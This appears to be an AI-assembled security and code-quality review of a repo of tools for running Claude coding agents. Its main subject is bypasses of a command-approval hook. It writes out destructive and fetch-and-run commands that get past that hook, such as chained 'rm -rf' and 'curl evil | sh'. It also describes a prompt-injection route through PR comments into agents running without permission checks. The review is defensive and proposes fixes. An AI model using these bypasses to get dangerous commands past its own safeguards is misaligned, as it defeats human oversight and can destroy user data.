# phillipgreenii-nix-agent-support — Deepdive Review (2026-06-12)

> Assembled by the orchestrator from six parallel fable sub-agent reviews after the
> dispatching agent hit the org monthly spend limit mid-assembly. Each finding retains
> its `file:line` references. **One tool — `pg-pr` — was not reviewed** (its sub-agent
> was the one killed by the spend limit). See Scope & Coverage.

## Scope & Coverage

This is the largest repo in the workspace (~975 tracked files: 543 Go, 149 md, 89 nix,
49 sh, 30 bats, 28 toml). It packages a fleet of Go tools + nix glue + shell "packs"
that support AI coding agents. Coverage by area:

| Area | Depth | Notes |
|------|-------|-------|
| `packages/claude-extended-tool-approver` (Go) | **Deep** | Findings empirically confirmed by building the binary and feeding crafted PreToolUse JSON |
| `packages/ccpool` (Go) | **Deep** | All `cmd/` + `internal/` read line-by-line |
| `packages/pa-monitor` (Go) | **Deep** | Daemon/server/store/nudger read; TUI + render skipped |
| `packages/pr-pool` (Go) | **Deep** | All 35 `.go` files |
| `packages/claude-transcript` (Go shared lib) | **Deep** | Fans out to ccpool, pa-monitor, pr-pool |
| `packages/pa-monitor-decorator-gc` (Go) | **Deep** | Small stub |
| Shell packs (`pgii-pack-*`, `git-tools`, `gc-dolt-maintenance`, activation scripts) | **Deep** | ~40 scripts read |
| `lib/` nix builders (`mkPgiiPack`, `python-package`, `agent-script`) | **Deep** | |
| nix build plumbing (`flake.nix`, buildGoModule coupling, pre-commit, `update-locks.sh`) | **Medium** | |
| **`packages/pg-pr` (Go)** | **NOT REVIEWED** | Sub-agent killed by spend limit. PR-automation tool that shells out to `gh`/`git`/Jira — security-relevant and still needs a pass. |
| `internal/tui`, `internal/render` (pa-monitor) | Skipped | Per reviewer scope |
| Generated `*.pb.go`, `go.sum` | Skipped | |

## Inventory

- **claude-extended-tool-approver (ceta)** — Claude Code PreToolUse hook that auto-approves/denies/asks on agent commands; also a cobra analytics CLI logging decisions to SQLite.
- **ccpool** — single-user CLI managing a pool of named long-lived Claude TUI sessions in a dedicated tmux server, with a SQLite state machine driven by Claude Code hooks.
- **pa-monitor** — per-user daemon (gRPC over a 0600 unix socket) that discovers Claude sessions, scans transcripts, nudges stuck sessions, and serves thin TUI/CLI/cmux clients.
- **pr-pool** — cron-shaped orchestrator that discovers ready "feedback"/"worker" beads and spins up one ccpool-managed Claude session per bead, with a token/cost/time budget watchdog.
- **claude-transcript** — tiny shared lib parsing Claude transcript JSONL ("last assistant reply?", "is it awaiting input?"); consumed by ccpool, pa-monitor, pr-pool.
- **pa-monitor-decorator-gc** — stub stdin/stdout JSON label decorator for pa-monitor (Gas City–specific; likely dead, see below).
- **pg-pr / pg-pr-plugin** — PR automation + a PreToolUse marker hook (Go tool not reviewed; the plugin's shell hook was).
- **pgii-pack-\*** — gascity "pack" workaround orders + doctor checks (dolt archive/compact, PR-pipeline watchers, stale-bead/lock sweepers, etc.).
- **git-tools** — `git-branch-maintenance`, `git-branch-status`, `git-choose-branch`.
- **lib/** — `mkPgiiPack`, `python-package.nix`, `agent-script.nix` nix builders.

## Executive Summary (ranked, cross-tool)

1. **ceta — the security tool that gates every agent command is broadly bypassable (multiple CRITICALs, empirically confirmed).** `git status && rm -rf ~`, `curl localhost | sh`, `nix develop -c rm -rf /etc`, `echo hi & rm -rf ~`, and `rm -rf $HOME/.ssh` all return `allow`. Root cause: a hand-rolled bash parser + a first-match-wins engine where each rule judges only the first segment it recognizes. This is the single highest-impact issue in the workspace because ceta is the backstop that lets agents run unattended.
2. **pr-pool runs permissionless agents on externally-influenced input by default, and `pr-pool --version`/`-h` silently executes a real drain.** `--dangerously-skip-permissions` defaults ON (`config.go:70`); prompts derive from external PR-reviewer comments → prompt-injection-to-RCE pipeline. Combined with ceta's bypasses, the "defense in depth" is thin in both layers.
3. **ccpool can route commands to the wrong session and silently rewrites `~/.claude.json`.** tmux prefix matching (`a` matches `ab`) plus a folder-trust write to the *caller's* cwd, plus a non-atomic whole-file rewrite of the file holding OAuth/account state, are all in the path of routine `reply`/`resume`.
4. **`claude-transcript`'s `IsAwaitingInput` likely produces false "not awaiting" results** (resets pending questions per JSONL event, not per turn) — and that bug fans out to all three consumers, which is exactly how an autonomous fleet silently stalls.
5. **pg-pr's PreToolUse marker hook is doubly dead** — no `hooks.json` registration and it gates on `CLAUDE_TOOL_NAME`, an env var Claude Code never sets. The control that's supposed to stop agents posting unmarked PR comments does nothing.
6. **pa-monitor (the monitoring tool) swallows its own errors and can leak secrets.** Tick-loop `Snapshot` failures `continue` silently forever; full process-env (incl. `GITHUB_TOKEN`/`ANTHROPIC_API_KEY`) is captured and forwarded to decorators/LabelPairs, contradicting the stated privacy guard.
7. **A `caffeinate`-toggle data-loss bug and a daemon/clients state divergence in pa-monitor** (runtime.json migration re-runs every restart; the DB-materialized client view silently drops `WindowResetsAt`, `Env`, and nudge history).
8. **CI/test gating doesn't actually exercise most of the Go code.** `subPackages` limits the nix `checkPhase` to `cmd/` tests for pa-monitor/pg-pr/ceta; `claude-transcript` tests run nowhere; golangci-lint covers only 2 of 6 Go modules; `update-locks.sh` never bumps ccpool/pr-pool/decorator deps.
9. **Several modules are likely dead** post Gas City decommission (2026-06-11): `pa-monitor-decorator-gc` (empty `decorate()`), and `/Users/phillipg/gc` paths baked into "composable" module defaults.
10. **Pervasive temp-file / log litter** from doctor checks and hack scripts that fire every few minutes forever — ironic for a pack whose purpose is reclaiming disk.

---

## Security

### claude-extended-tool-approver — CRITICAL cluster (all confirmed against the built binary)

- **Compound-command short-circuit** — `internal/engine/engine.go:39-76` + every family rule (`git/git.go:59-144`, `curl/curl.go:64-85`, `gh`, `docker/docker.go:75-83`, `nix/nix.go:74-101`). `Evaluate` returns the first non-Abstain decision for the *whole* string; family rules judge only the first recognized segment and are registered *before* `safecmds` (`setup/factory.go:45-63`), the only rule that vets every segment. Confirmed `allow`: `git status && rm -rf ~/important`, `git status ; /tmp/evil`, `git status\n/tmp/evil`, `git log | tee /etc/cron.d/x`, `curl http://localhost:8080/payload | sh`, `gh pr list && curl evil | sh`. **Fix:** evaluate the whole command as a tree; every leaf must be affirmatively approved (no segment may Abstain).
- **Recursive evaluator fails open** — `engine.go:131-138,167-197`. `evaluateRedirections` returns `Approve("no redirections to evaluate")` as a *neutral* signal; with ordering `Abstain(0) < Approve(1)`, that neutral Approve overrides a genuine Abstain, and sub-commands merge with `max()`. Confirmed `allow`: `nix develop --command bash -c "true; /tmp/evil"`, `docker run --rm alpine sh -c "true; /sbin/evil"`. **Fix:** make "no redirections" truly neutral; treat Abstain as *more* restrictive than Approve when combining.
- **`nix develop -c` blanket approval** — `nix/nix.go:109-122`. Only `--command` is parsed (`-c`, its documented alias, is not), so `innerCmd==""` → blanket `Approve`. Confirmed: `nix develop -c rm -rf /etc` → allow.
- **`&` background operator is not a separator** — `cmdparse/parser.go:205-309`. `splitCompound` handles `&& || ; | \n ()` but not single `&`. Confirmed: `echo hi & rm -rf ~/important` → allow (`rm` swallowed as args of `echo`).
- **Env-var paths skip all zone checks** — `safecmds/safecmds.go:368-373`. `looksLikePath` matches only literal `/ ./ ../ ~/`; `$HOME/...` is not treated as a path. Confirmed `allow`: `rm -rf $HOME/.ssh`, `rm -rf "$HOME"`, `echo evil | tee $HOME/.bashrc`. **Fix:** any arg containing `$`/backticks/failed-expansion → Abstain.
- **`git -c key=value` value discarded** — `git/git.go:150-170`. `git -c core.pager="touch /tmp/pwned" log` → allow. git config-injection is a known RCE class (`core.pager`, `core.sshCommand`, `core.fsmonitor`, `core.hooksPath`). **Fix:** Abstain on any `git -c`/`--config-env`.
- **config-rules blocklist bypassable** — `configrules/configrules.go:72-91` returns on first approved segment, so `approved && blocked` never reaches the blocked check. **Fix:** scan all segments for blocked entries first.
- **Command substitution in args not evaluated** — `parser.go:414-483`. `echo $(rm -rf ~/important)` → allow.
- **Overarching fix:** replace the hand-rolled `cmdparse` with a real shell parser (`mvdan.cc/sh/v3`) and make the verdict the most-restrictive leaf, Abstain ranked above Approve.
- *Positives (kept):* fails closed to the normal permission prompt on malformed JSON/panics/Abstain; SQLite logging uses parameterized queries throughout.

### pr-pool
- **`--dangerously-skip-permissions` defaults ON** — `internal/config/config.go:70`, emitted at `internal/ccpool/cli.go:61-63`. Prompts derive from external PR-reviewer comments → unattended prompt-injection into a permissionless agent that can `git push`. **Fix:** default to opt-in; constrain via allowed-tools.
- **Help/version/bad-flag silently runs a full drain** — `cmd/pr-pool/args.go:12` swallows `flag.ErrHelp`; `pickSubcommand` routes any unknown first arg to `drain`. `pr-pool --version` / `-h` / `drain --bogus` dispatch real Claude sessions and tear down all `pr-pool-*` tmux sessions. Fail-open on a help request.
- **`CombinedOutput` mixes stderr into `ccpool list --json`** — `internal/ccpool/cli.go:36`; any stderr noise breaks `List` → "assume alive" → silent degradation; `teardownAll` skips reaping.

### ccpool
- **tmux prefix matching → wrong-session commands** — `internal/tmux/client.go:69,77,84,95,101`. With `cc-a` dead and `cc-ab` live, `reply a` pastes into `ab`; `close a` `/exit`s `ab`. **Fix:** `-t =name` (exact).
- **Folder-trust granted to the wrong directory** — `internal/session/session.go:149-155` trusts `cwd`, but resume launches in `row.CWD` (`:172`); `cmd/ccpool/reply.go:73-78` passes the caller's cwd. Running `ccpool reply foo` from `~/Downloads` writes `hasTrustDialogAccepted:true` for `~/Downloads` into `~/.claude.json` — a silent trust grant for a dir no session uses.
- **`~/.claude.json` whole-file rewrite can corrupt** — `internal/trust/trust.go:19-22,72-91`. Decodes into `map[string]any` (ints → float64, precision loss > 2^53), renames without `fsync`, drops anything Claude wrote concurrently. Blast radius = the user's entire Claude config. **Fix:** `Decoder.UseNumber()`, `f.Sync()` before rename, keep `.bak`.
- **`StopFailure` is (almost certainly) not a real Claude Code hook event** — `ccpool-plugin/hooks/hooks.json:9-11`, `cmd/ccpool/hook.go:28`. If so, the entire `failed` state machinery is dead code; the only "test" pins the file's own content.
- **SessionStart `source` not filtered** — `cmd/ccpool/hook.go:17-22,87-95`. compact/clear fires SessionStart → flips a mid-turn session to `ready` → `reply` returns exit 0 with empty output mid-turn.
- **Session name unvalidated** — `internal/lock/flock.go:24` `filepath.Join(dir, name+".lock")`; `ccpool new '../../../x'` escapes the runtime dir; `:`/`.`/`=` change tmux target semantics. pr-pool feeds names programmatically. **Fix:** validate `^[A-Za-z0-9_-]+$` at the boundary.
- **flock: unbounded blocking + world-writable `/tmp/ccpool` fallback** — `internal/lock/flock.go:25`, `internal/config/config.go:110-114`. On macOS `XDG_RUNTIME_DIR` is unset → `/tmp` → another user can hold `<name>.lock` forever (DoS).

### pa-monitor
- **Full process-env capture vs. the stated privacy guard** — `internal/core/session/discovery.go:75` captures every env token via `ps -E -ww` (incl. `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`), piped wholesale into decorator subprocesses (`internal/labels/decorator.go:77`) and forwarded as `LabelPairs` (`server.go:159-165`) — directly contradicting `translate.go:106-107` ("only forward known keys"). Currently dead only because of the H2 Env-drop bug; a naive H2 fix makes the leak live. **Fix:** allowlist at discovery time.
- **gRPC hardening gaps** — `server.go:391` `grpc.NewServer()` defaults: no `MaxConcurrentStreams`, no keepalive; `WatchState` honors `PushIntervalMs` down to 50ms, each push doing a full DB materialization with `context.Background()`. Socket chmod 0600 happens *after* `Listen` (brief window). **Fix:** floor the interval ~250-500ms; bind perms atomically.
- *Positives (kept):* all exec uses argv arrays (no shell strings); decorator commands constrained to `/nix/store/` with `filepath.Clean`; SQLite WAL + busy_timeout + FK pragmas; `go vet` clean.

### Shell / nix
- **pg-pr marker hook is doubly dead** — `packages/pg-pr-plugin/share/.../hooks/require-agent-pr-comment-marker.sh:25` + `home/programs/pg-pr-plugin/default.nix:52-55`. No `hooks/hooks.json` and `plugin.json` declares no hooks (never invoked); and it branches on `${CLAUDE_TOOL_NAME:-}` which CC delivers as `.tool_name` in stdin JSON, so it always hits the passthrough `exit 0`. The defense-in-depth against unmarked PR comments provides zero protection. **Fix:** add `hooks.json` with a `PreToolUse`/`Bash` matcher; read `.tool_name` from payload; add a bats test asserting exit 2.
- **`bash-env.sh` PATH-prepends any ancestor `bin/` next to a `.envrc`, bypassing direnv's trust gate** — `packages/pgii-pack-workers/.../worker/scripts/bash-env.sh:33-44`. An autonomous worker that `cd`s into any checkout with `.envrc`+`bin/` gets that repo's binaries first on PATH (`git`, `step`, …) — a binary-planting vector. **Fix:** restrict the walk-up to registered rig roots.
- **`agent-script.nix` runs the agent via `eval` and pipes the prompt through `echo`** — `lib/agent-script.nix:76`. `eval` of a flat command string (author-controlled, so mitigated) plus `echo "$1"` mangles prompts starting with `-n`/`-e` or containing backslashes. **Fix:** build an argv array and `printf '%s' "$prompt" | "${cmd[@]}"`.
- **`mkPgiiPack` envsubst substitutes *all* exported env vars** — `lib/mkPgiiPack.nix:8-10` vs `:78-81`. Header claims an explicit allow-list; code runs bare `envsubst`, so `${HOME}`/`${PATH}`/`${out}` in any `*.template` get baked with sandbox values (`/homeless-shelter`). **Fix:** pass the variable allow-list.
- **`git-branch-maintenance.sh`** — word-splitting on worktree paths (`awk '/^worktree / {path=$2}'` truncates paths with spaces, `:103-106`), predictable `/tmp/git-branch-maintenance-$$` + fixed `tmp-gbm` branch that a concurrent run rips out mid-rebase (`:168-188,570-572`). **Fix:** `mktemp -d`, suffix temp branch with `$$`.
- Lower: SQL string-interpolation in `hack-order-override-watchdog.sh:110-115` (operator-controlled); jq program-text splicing in `hack-message-forwarder.sh:92`; `--password ""` on argv.

---

## Architecture

- **ceta root cause is architectural:** a hand-rolled parser (`cmdparse`) + first-match-wins engine where rules judge only what they recognize. Every security finding is a symptom. Re-architect around a real parse tree + most-restrictive-leaf evaluation.
- **pa-monitor's in-memory→SQLite cutover is half-done** (comments reference "Task 19/20"). The live poller tree (what the nudger acts on) and the DB-materialized tree (what clients see) have diverged: `blockToStoreBlock` never sets `RateLimitResetsAt` (`lifecycle.go:805-816`) so clients' paused indicator can never fire; `Env` isn't persisted (`state_convert.go:122-125`) so the cmux bridge's per-workspace filter and `cmux:<id>` selectors silently no-op; nudge history hardcodes `LatestNudge=nil` (`read_service.go:94`). Pick one source of truth.
- **`claude-transcript` is a shared lib with no reusable iteration primitive** — both exports take a filename and re-read from byte 0; no `io.Reader` variant, no exported `ForEachEvent`. pr-pool's `internal/usage/transcript.go:30-34` already re-implements the open/scan/unmarshal loop with its *own* buffer constants — the next re-implementation is where the 64KB-scanner regression returns. **Fix:** export `ForEachEvent(r io.Reader, fn func(Event) error) error` carrying the buffer policy.
- **pr-pool's watchdog/waitDone race serializes only the returned error, not side effects** (`orchestrator.go:158-166`): concurrent `AddHuman` vs `Unclaim` can both fire (bead ends `open` *and* `human`), and a budget hard stop can be misreported as success when `waitDone` observes the watchdog's unclaim before its ctx cancels. **Fix:** cancel the shared context (or set a terminal-owner flag) *before* terminal bead mutations.
- **Service wiring triplicated** in ccpool (`new.go:64-77`, `reply.go:55-71`, `cancel.go:60-90`) and already drifting (`new.go`'s Deps lack `Transcript`/`Notify` → latent nil-panic). Four byte-identical `update-deps.sh` copies (`packages/{ceta,pa-monitor,pg-pr,pr-pool}/`).
- **Likely dead modules** post Gas City decommission: `pa-monitor-decorator-gc` (empty `decorate()`, `main.go:83-85`); `/Users/phillipg/gc` baked into `gc-dolt-maintenance` HM default (`default.nix:15`) and `hack-archive-and-compact.sh:85`, breaking the repo's own composability contract.

---

## Best Practices / Code Quality

- **Context ignored where the whole design depends on it** — pr-pool's `ccpool.CLIRunner` uses `exec.Command` not `exec.CommandContext` (`internal/ccpool/cli.go:35-37`); a wedged ccpool hangs the orchestrator and defeats the watchdog/waitDone cancellation it's built around. Same no-ctx bug in `watchdog/terminal.go:90`.
- **`max()`-with-Abstain-lowest** appears in both ceta (engine) and is the conceptual twin of pr-pool's swallowed errors: the safe direction is never the default.
- **Silent error swallowing** — pa-monitor tick loop `Snapshot` err → bare `continue` (`lifecycle.go:350-352`); `_ = fmt.Errorf(...)` thrown away with a comment saying "log the error" (`:260`); dispatcher `Send` failure emits no metric and the `'failed'` enum is never recorded, retrying every 5s with no backoff (`dispatcher.go:111-113`). pr-pool discovery errors return `nil,nil` so "no work" == "bd broken" (`discover.go:53-55`).
- **Token accounting likely wrong** (uncertain, verify against a real transcript): pr-pool sums `message.usage` per JSONL line without message-ID dedupe (`usage/transcript.go:37-44`) → over-counts multi-block turns → budgets trip early; price-table keys like `"claude-opus-4-8"` use exact match but transcript `message.model` carries date suffixes → everything falls through to the opus `_default` (`cost.go:17-24`), inflating sonnet/haiku cost 5-15×.
- **ccpool `Transition` uses a deferred (not immediate) transaction** (`store/ops.go:92-117`) → under multi-process WAL a read→write upgrade fails with `SQLITE_BUSY_SNAPSHOT`, which `busy_timeout` does *not* retry; the hook transition is dropped and a blocked `reply` waits the full 10-minute timeout. **Fix:** `_txlock=immediate`.
- **Unknown-subcommand-runs-something** in both ccpool (`main.go:29-35` → `list`) and pr-pool (`→ drain`). Only default to the safe verb on zero args / args starting with `-`; otherwise exit 2.
- **`python-package.nix` silently drops unresolvable PyPI deps** (`:82-89` → `builtins.trace` + `null` filter) and `dontCheckRuntimeDeps=true` (`:142`) removes the safety net → builds that `ImportError` at runtime. **Fix:** hard eval error + explicit `ignoredDeps` escape hatch.
- **`exit 1` overloaded** for specific meanings in several scripts (see workspace memory `exit-code-1-is-general-error`).

---

## Testing

- **The nix `checkPhase` doesn't run most Go tests.** `subPackages` limits it to `cmd/` tests for pa-monitor/pg-pr/ceta; `claude-transcript`'s tests run *nowhere*; golangci-lint covers only 2 of 6 Go modules. `nix flake check` builds checks, not packages, so a package's `doCheck` is the real gate — and it's scoped too narrowly. **Fix:** drop the `subPackages` scoping for tests (or add explicit test derivations per module); add `claude-transcript` to the test set; extend golangci-lint to all modules.
- **ceta:** zero tests for `cmd/ccpool tail/doctor/attach/main pickSubcommand`-equivalents; the engine's "most restrictive wins" test only covers an actively-*Rejected* sub-command, never the common *Abstain* case — giving false confidence about the fail-open class. No prefix-colliding-name test (would have caught the tmux/path bugs).
- **claude-transcript** (4 tests, 2 tiny fixtures): the `tool_result` resolution branch (`delete(pending,…)`) has zero coverage; the string-content branch of `ContentList.UnmarshalJSON` untested; no malformed-line test; **no >64KB line test** proving buffer sizing — the precise regression this lib must guard.
- **ccpool:** no malformed/truncated hook-stdin test (the "exit 0 on garbage" guarantee is untested e2e); no multi-process store-contention test (the actual production topology); no flock stale-holder/timeout test.
- **Shell packs:** destructive/critical scripts are **uncovered** — `hack-archive-and-compact` (prunes all closed beads), `hack-stale-lock-sweeper` (deletes git locks), `hack-mol-dog-jsonl` (binary-patches an upstream script), all 12 doctor checks, all 5 foremen/workers scripts, both pg-pr-plugin scripts. This violates the workspace convention that all shell scripts must have bats tests before LLMs rely on them.
- **pa-monitor** is the bright spot: every internal package has tests; only small glue files untested. Use it as the bar.

---

## UX / DX

- **`ccpool` / `pr-pool` have no `--help`/`--version` that behaves** — `pr-pool --version` runs a drain; ccpool has only a `version` subcommand and unknown subcommands silently `list`.
- **`ccpool tail`** swallows all errors (`return 1` with no stderr), never terminates, replays the whole transcript from the start, and corrupts partially-written lines (`cmd/ccpool/tail.go:25-68`).
- **Stale `starting` rows** linger forever in `ccpool list` on launch failure / wait timeout (`session.go:161-163,218-228`) — the same class the close-reconcile fix (pg2-4f0y) already solved for close.
- **Doctor-check correctness rot:** `check-pr-feedback-backlog` age alert is dead on macOS (`date -d` is GNU-only, `run.sh:56`) — use jq `fromdateiso8601` like the sibling checks do.
- **Litter that never stops:** six doctor checks leak `$TMP.<suffix>` siblings the `rm -f "$TMP"` trap misses (every few minutes, forever); three hack scripts write `run-<epoch>.log` (~288/day each) never pruned. **Fix:** `trap 'rm -f "$TMP" "$TMP".*' EXIT INT TERM`; prune old logs.
- **`hack-mol-dog-jsonl.sh:81-83`** patches an upstream script by sed/perl with no match verification — a reworded upstream silently no-ops and runs the unpatched script. Add `grep -q … || exit 1` after patching.

---

## Modernization & Alternatives

- **ceta:** adopt `mvdan.cc/sh/v3` for parsing (kills the entire bypass class structurally); consider re-framing the engine as a deny-by-default allowlist evaluated over the full AST. Add fuzzing over `cmdparse` (Go native fuzzing) — this is the textbook fuzz target.
- **Go fleet:** standardize on `slog` (pa-monitor's silent paths are the argument); `errgroup` for the orchestrator races; `exec.CommandContext` everywhere with per-call timeouts; `golangci-lint` across *all* modules in CI (not 2/6). Consider `goreleaser` if any of these ship beyond nix.
- **claude-transcript:** make it the one true parser — `io.Reader` API + `ForEachEvent`, message-ID-aware turn folding — and have pr-pool's usage reader and pa-monitor both consume it instead of re-implementing. This single change fixes the awaiting-input false-negative, the token double-count, and the 64KB-regression risk at once.
- **nix packaging:** evaluate `gomod2nix` to make vendorHash drift a non-issue (the workspace has repeatedly been bitten by vendorHash/local-replace — see memory `go-local-replace-vendorhash`). Collapse the four `update-deps.sh` into one parameterized script; extend `update-locks.sh` to cover ccpool/pr-pool/decorator.
- **python-package.nix:** move to `uv2nix` (fast, lockfile-driven, resolves the "missing dep silently dropped" problem with a real resolver) over the hand-rolled PyPI→nixpkgs mapping.
- **Decommission cleanup:** delete `pa-monitor-decorator-gc` and the `gc`-rooted defaults now that Gas City is gone (ADR 0043), or explicitly re-scope them.

---

## Prioritized Action List

| # | Sev | Action | Where |
|---|-----|--------|-------|
| 1 | **Critical** | ceta: evaluate the whole command tree, every leaf must affirmatively approve; Abstain ranked above Approve | `engine/engine.go`, all family rules |
| 2 | **Critical** | ceta: handle `&` separator, `$(...)`/backtick args, `nix develop -c`, `$VAR` paths, `git -c` — or Abstain on each | `cmdparse/parser.go`, `nix/nix.go`, `safecmds/safecmds.go:368`, `git/git.go:150` |
| 3 | **Critical** | ceta: replace hand-rolled parser with `mvdan.cc/sh/v3`; add fuzzing | `internal/cmdparse` |
| 4 | **High** | pr-pool: default `--dangerously-skip-permissions` to OFF; constrain workers via allowed-tools | `internal/config/config.go:70` |
| 5 | **High** | pr-pool: make `--help`/`--version`/bad-flag exit without side effects | `cmd/pr-pool/args.go:12`, `drain.go:34` |
| 6 | **High** | ccpool: exact tmux targets (`-t =name`); fix folder-trust to use `row.CWD`; atomic `~/.claude.json` rewrite (UseNumber + fsync + .bak) | `tmux/client.go`, `session/session.go:149`, `trust/trust.go` |
| 7 | **High** | ccpool: verify `StopFailure` hook event; filter SessionStart `source`; `_txlock=immediate`; validate session names | `hooks.json`, `hook.go`, `store/ops.go:92`, `lock/flock.go:24` |
| 8 | **High** | claude-transcript: message-ID-aware turn folding; fixes awaiting-input false negative across all 3 consumers | `awaiting.go:34`, `reader.go` |
| 9 | **High** | pg-pr marker hook: register via `hooks.json`, read `.tool_name` from payload, add bats test | `pg-pr-plugin` |
| 10 | **High** | pa-monitor: allowlist env at capture (stop leaking tokens); add timeouts on `ccusage weekly`; stop swallowing tick-loop errors | `session/discovery.go:75`, `lifecycle.go:350,354` |
| 11 | **High** | pa-monitor: fix runtime.json one-shot migration (caffeinate data loss) and the DB-vs-live state divergence | `runtime_migration.go`, `lifecycle.go:805`, `state_convert.go` |
| 12 | **High** | CI: run all Go tests (drop `subPackages` test-scoping), add claude-transcript, golangci-lint all 6 modules | `flake.nix`, builders |
| 13 | **Med** | pr-pool: `CommandContext` + timeouts; separate stdout/stderr; cancel ctx before terminal bead mutations | `internal/ccpool/cli.go`, `orchestrator.go:158` |
| 14 | **Med** | pr-pool: dedupe tokens by message ID; prefix-match price table keys | `usage/transcript.go`, `cost.go:17` |
| 15 | **Med** | nix: `mkPgiiPack` envsubst allow-list; `agent-script.nix` argv not eval; `python-package.nix` hard-fail on missing deps | `lib/*.nix` |
| 16 | **Med** | Shell: fix `bash-env.sh` direnv-trust bypass; `git-branch-maintenance` worktree word-split + `mktemp -d`; verify hack-mol-dog patch applied | various |
| 17 | **Med** | Add bats for all destructive/critical scripts + 12 doctor checks; fix temp-file/log litter traps | shell packs |
| 18 | **Med** | Collapse 4× `update-deps.sh`; extend `update-locks.sh` to ccpool/pr-pool/decorator; evaluate `gomod2nix`/`uv2nix` | repo-level |
| 19 | **Low** | Delete dead Gas City modules (`pa-monitor-decorator-gc`, `gc`-rooted defaults) per ADR 0043 | `packages/`, `lib/`, `home/` |
| 20 | **Open** | **Review `pg-pr` Go tool** — not covered this pass (spend limit); it shells out to gh/git/Jira | `packages/pg-pr` |
